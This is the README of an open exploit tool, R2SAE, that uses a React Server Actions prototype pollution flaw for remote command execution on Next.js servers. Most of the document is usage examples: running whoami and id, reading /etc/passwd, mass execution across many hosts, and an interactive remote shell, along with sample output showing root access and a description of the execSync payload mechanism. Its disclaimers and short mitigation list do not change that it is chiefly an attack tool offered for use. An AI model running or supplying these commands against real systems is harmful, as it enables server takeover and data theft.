# R2SAE - React2Shell Auto-Exploit

A CLI tool to exploit **prototype pollution** vulnerabilities in React Server Actions, enabling remote command execution (RCE) on vulnerable servers.

## ⚠️ Warning

**This tool is for educational purposes and authorized security testing only. Unauthorized use of this tool against systems without permission is illegal and strictly prohibited.**

## 📋 Requirements

- Python 3.6 or higher
- `requests` >= 2.31.0

## 🔧 Installation

1. Clone the repository:
```bash
git clone https://github.com/sammwyy/r2sae
cd r2sae
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

Or install directly:
```bash
pip install requests
```

## 📖 Usage

R2SAE uses a subcommand-based interface. The main commands are:

- `exec` - Execute commands on target host(s)
- `shell` - Interactive shell mode
- `scan` - Scan host(s) for vulnerability

### Exec Command

Execute a specific command on one or more target servers:

```bash
python r2sae.py exec <hosts> -c "command"
```

**Examples:**
```bash
# Execute whoami on a single host
python r2sae.py exec http://localhost:3000 -c whoami

# Execute id on multiple hosts
python r2sae.py exec http://target1.com http://target2.com -c "id"

# Execute with verbose output
python r2sae.py exec http://target.com -c "ls -la" -v

# Execute without capturing output
python r2sae.py exec http://target.com -c "touch /tmp/test" --no-output

# Save results to JSON file
python r2sae.py exec http://target.com -c whoami -o results.json -f json

# Execute without colors (useful for scripts)
python r2sae.py exec http://target.com -c id -n
```

### Shell Command

Start an interactive shell to execute multiple commands on one or more hosts:

```bash
python r2sae.py shell <hosts>
```

**Example:**
```bash
# Single host
python r2sae.py shell http://localhost:3000

# Multiple hosts (commands execute on all hosts)
python r2sae.py shell http://host1.com http://host2.com
```

In interactive mode:
- Type commands and press Enter to execute them on all hosts
- Each result shows the host that generated it: `> (host) output`
- Type `exit`, `quit` or `q` to exit
- Use `Ctrl+C` to interrupt

### Scan Command

Scan one or more hosts for vulnerability detection:

```bash
python r2sae.py scan <hosts> [--active]
```

**Examples:**
```bash
# Passive scan (default) - uses expression evaluation
python r2sae.py scan http://target.com

# Active scan - uses shell command execution
python r2sae.py scan http://target.com --active

# Scan multiple hosts
python r2sae.py scan http://host1.com http://host2.com http://host3.com

# Save scan results to CSV
python r2sae.py scan http://target.com --active -o scan_results.csv -f csv
```

**Scan Methods:**
- **Passive (default)**: Evaluates a mathematical expression (`1337 + 42`) without executing system commands. Safer and less intrusive.
- **Active (`--active`)**: Executes the `id` command to verify vulnerability. More accurate but more intrusive.

### Global Options

```
Global options (available for all commands):
  -h, --help                  Show help message
  -v, --verbose               Detailed output (verbose)
  -n, --no-colors             Disable colored output
  -o, --output FILE           Save results to file
  -f, --output-format FORMAT  Output format: json, csv, or txt (default: txt)
  --no-banner                 Suppress the banner

Exec command options:
  -c, --command COMMAND        Command to execute on target (required)
  --no-output                 Do not attempt to read command output

Scan command options:
  --active                    Use active scan method (shell) instead of passive (expression)
```

## 📝 Usage examples

### Example 1: Execute command on single host
```bash
python r2sae.py exec http://vulnerable-app.com -c whoami
```

**Output:**
```
[*] Executing on: http://vulnerable-app.com

(Out) http://vulnerable-app.com: root
```

### Example 2: Execute command on multiple hosts
```bash
python r2sae.py exec http://host1.com http://host2.com http://host3.com -c "id"
```

**Output:**
```
[*] Executing on: http://host1.com
[*] Executing on: http://host2.com
[*] Executing on: http://host3.com

(Out) http://host1.com: uid=0(root) gid=0(root) groups=0(root)
(Out) http://host2.com: uid=1000(user) gid=1000(user) groups=1000(user)
(Err) http://host3.com: No output captured
```

### Example 3: Save results to JSON file
```bash
python r2sae.py exec http://target.com -c "ls -la" -o results.json -f json
```

### Example 4: Interactive shell mode with multiple hosts
```bash
python r2sae.py shell http://host1.com http://host2.com
```

**Example session:**
```
[*] Interactive mode enabled
[*] Targets: http://host1.com, http://host2.com
[*] Type 'exit' or 'quit' to exit

Shell: whoami
> (http://host1.com) root
> (http://host2.com) admin
Shell: pwd
> (http://host1.com) /var/www/app
> (http://host2.com) /home/admin
Shell: exit
```

### Example 5: Passive vulnerability scan
```bash
python r2sae.py scan http://target.com
```

**Output:**
```
[*] Scanning: http://target.com

[+] VULNERABLE (expr method)
[+] Result: 1379

============================================================
Scan Summary:
============================================================
  http://target.com: VULNERABLE (expr)

Total: 1/1 vulnerable
```

### Example 6: Active vulnerability scan
```bash
python r2sae.py scan http://target.com --active
```

### Example 7: Scan multiple hosts and save to CSV
```bash
python r2sae.py scan http://host1.com http://host2.com -o scan_results.csv -f csv
```

### Example 8: Execute without colors (for scripts)
```bash
python r2sae.py exec http://target.com -c whoami -n -o output.txt
```

### Example 9: Batch execution with output export
```bash
python r2sae.py exec http://host1.com http://host2.com -c "cat /etc/passwd" -o results.json -f json -n
```

## 🔍 How it works

R2SAE exploits a **prototype pollution** vulnerability in React Server Actions by:

1. **Payload construction**: Creates a multipart/form-data payload that pollutes JavaScript object prototypes
2. **Code injection**: Uses `process.mainModule.require('child_process').execSync()` to execute system commands
3. **Output capture**: Sends command output via a Next.js redirect in the `X-Action-Redirect` header
4. **Extraction**: Parses and decodes the output from the response header

### Scan Methods Explained

**Passive Scan (Expression Evaluation):**
- Evaluates a JavaScript expression (`1337 + 42`) without executing system commands
- Returns the result (`1379`) if the vulnerability exists
- Non-intrusive and safe for initial detection
- Uses `build_expression_payload()` to create a safe test payload

**Active Scan (Shell Command):**
- Executes the `id` command to verify full RCE capability
- Checks for typical command output patterns (`uid=`, `gid=`)
- More accurate but more intrusive
- Uses the same exploit mechanism as command execution

### Output Formats

- **JSON**: Structured data with timestamp, command, and results array
- **CSV**: Tabular format with columns for host, success/vulnerable status, and output
- **TXT**: Human-readable plain text format with labeled fields

## 🛡️ Mitigation

To protect your React/Next.js application against this vulnerability:

1. Update Next.js to the latest version
2. Use environment variables for sensitive configurations
3. Regularly review and update dependencies

## 📄 License

This project is for educational and security research purposes only. Use of this tool is the user's responsibility.

## 🤝 Contributing

Contributions are welcome. Please:

1. Fork the project
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

**Remember**: Use this tool responsibly and only on systems where you have explicit authorization to perform security testing.

